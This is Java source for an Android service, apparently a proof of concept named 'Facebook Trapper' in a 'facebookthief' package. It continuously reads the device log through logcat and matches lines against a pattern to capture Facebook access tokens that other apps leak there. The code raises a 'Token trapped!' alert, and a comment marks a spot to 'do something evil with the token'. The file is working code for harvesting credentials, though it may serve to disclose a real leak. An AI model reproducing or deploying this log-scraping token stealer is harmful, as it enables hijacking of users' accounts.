package com.pixplicity.example.facebookthief;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;

public class LogService extends Service {

	public static final String SERVICE_QUERY = "com.pixplicity.example.SERVICE_QUERY";
	public static final String SERVICE_RESPONSE = "com.pixplicity.example.SERVICE_RESPONSE";
	public static final String TRAPPER_RESPONSE = "com.pixplicity.example.TRAPPER_RESPONSE";

	private static Thread mThread;

	private final ArrayList<LogResult> mResults = new ArrayList<LogResult>();
	private QueryReceiver mReceiver;

	private class QueryReceiver extends BroadcastReceiver {
		@Override
		public void onReceive(Context context, Intent intent) {
			// Respond to the query
			sendResponse(mThread != null && mThread.isAlive());
			// Send all results
			synchronized (mResults) {
				for (int i = 0; i < mResults.size(); i++) {
					sendResult(mResults.get(i));
				}
			}
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		// The service is first created
		Log.i(LogActivity.TAG, "starting service");
		// Listen to queries to the service
		mReceiver = new QueryReceiver();
		registerReceiver(mReceiver, new IntentFilter(SERVICE_QUERY));
		int id = 0;
		startForeground(id, showNotification(id, "Facebook Trapper running"));
		if (mThread == null || !mThread.isAlive()) {
			mThread = new Thread() {
				int count = 0;
				Pattern pattern = Pattern.compile(LogResult.getRegEx());
				String verbosity = LogResult.getVerbosity();

				@Override
				public void run() {
					Process process = null;
					BufferedReader reader = null;
					int bufferSize = 0;
					if (verbosity.equals("V")) {
						// Try to determine the size of the ring buffer; this
						// gives us a general idea how many bytes we need to
						// read until we reach "fresh" log messages; this trick
						// only works for verbose output
						try {
							process = Runtime.getRuntime().exec(
									new String[] { "logcat", "-g" });
							// Read the process stream
							reader = new BufferedReader(new InputStreamReader(
									process.getInputStream()),
									1024);
							Pattern pattern = Pattern
									.compile("\\(([0-9]+)([MK]?b) consumed\\)");
							String line = reader.readLine();
							Matcher matcher = pattern.matcher(line);
							if (matcher.find() && matcher.groupCount() > 0) {
								bufferSize = Integer.parseInt(matcher.group(1));
								if (matcher.groupCount() > 1) {
									if (matcher.group(2).equals("Kb")) {
										bufferSize *= 1024;
									} else if (matcher.group(2).equals("Mb")) {
										bufferSize *= 1024 * 1024;
									}
								}
								Log.d(LogActivity.TAG, "logcat ring buffer: "
										+ bufferSize);
							} else {
								Log.d(LogActivity.TAG, line);
							}
						} catch (IOException e) {
							Log.e(LogActivity.TAG, e.getMessage());
						} finally {
							if (process != null) {
								process.destroy();
							}
							if (reader != null) {
								try {
									reader.close();
								} catch (IOException e) {
								}
							}
						}
					}
					// Read the log output through logcat
					try {
						process = Runtime.getRuntime().exec(
								new String[] { "logcat", "-v", "time",
										"*:" + verbosity });
						// Read the process stream
						reader = new BufferedReader(new InputStreamReader(
								process.getInputStream()),
								1024);
						long bytes = 0;
						long start = 0;
						while (!isInterrupted()) {
							final String line = reader.readLine();
							if (bytes == 0) {
								// The process started; indicate that the
								// service is ready
								sendResponse(true);
								start = System.currentTimeMillis();
							}
							if (line == null) {
								break;
							}
							if (bytes >= 0) {
								bytes += line.length();
								if (bytes > bufferSize) {
									if (bufferSize > 0) {
										// Reached end of ring buffer
										Log.i(LogActivity.TAG,
												"reached end of ring buffer");
									}
									bytes = -1;
								}
							}
							handleLine(line);
							// Short delay to prevent locking up
							Thread.sleep(5);
						}
					} catch (IOException e) {
						Log.e(LogActivity.TAG, e.getMessage());
						// Something went wrong; abort
					} catch (InterruptedException e) {
						// Stop thread
					} finally {
						if (process != null) {
							process.destroy();
						}
						if (reader != null) {
							try {
								reader.close();
							} catch (IOException e) {
							}
						}
					}
					Log.i(LogActivity.TAG, "service stopped");
					showNotification(-1, "Facebook Trapper stopped");
					stopSelf();
				}

				public void handleLine(final String line) {
					Matcher match = pattern.matcher(line);
					if (match.find()) {
						String interest = null;
						if (match.groupCount() > 0) {
							interest = match.group(1);
						}
						LogResult result = new LogResult(line, interest);
						if (result.interest != null) {
							// TODO Do something evil with the token
							showNotification(++count, "Token trapped!", result);
							Log.d(LogActivity.TAG, "found match");
						}
						synchronized (mResults) {
							mResults.add(result);
							// Prune the list
							for (int i = 0; i < Math.max(0, mResults.size()
									- LogActivity.MAX_ITEMS); i++) {
								mResults.remove(0);
							}
						}
						// Update the list
						sendResult(result);
					}
				};
			};
			mThread.start();
		}
	}

	@Override
	public void onDestroy() {
		// The service is shutting down
		stop();
	}

	public void stop() {
		Log.i(LogActivity.TAG, "stopping service");
		mThread.interrupt();
		stopForeground(true);
		unregisterReceiver(mReceiver);
		sendResponse(false);
		stopSelf();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		return super.onStartCommand(intent, flags, startId);
	}

	protected Notification showNotification(int id, String title) {
		return showNotification(id, title, null);
	}

	protected Notification showNotification(int id, String title,
			LogResult result) {
		NotificationManager ns = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
		Notification notification = new Notification(
				R.drawable.ic_launcher, title,
				System.currentTimeMillis());
		boolean cancel = false;
		if (id < 0) {
			id = 0;
			cancel = true;
		}
		final Intent intent;
		if (id == 0) {
			intent = new Intent(this, LogActivity.class);
			notification.flags |= Notification.FLAG_ONGOING_EVENT;
			notification.icon = R.drawable.ic_service;
		} else {
			intent = result.getIntent();
			notification.sound = Uri.parse("android.resource://"
					+ getPackageName() + "/" + R.raw.alarm);
			notification.icon = R.drawable.ic_security;
		}
		PendingIntent contentIntent = PendingIntent
				.getActivity(this, 0, intent, 0);
		notification.setLatestEventInfo(this, title, result == null ? null
				: result.interest, contentIntent);
		ns.notify(id, notification);
		if (cancel) {
			ns.cancel(id);
		}
		return notification;
	}

	private void sendResult(LogResult result) {
		Intent intent = new Intent(TRAPPER_RESPONSE);
		intent.putExtra("result", result);
		sendBroadcast(intent);
	}

	private void sendResponse(boolean alive) {
		Intent broadcast = new Intent(SERVICE_RESPONSE);
		broadcast.putExtra("alive", alive);
		sendBroadcast(broadcast);
	}

}
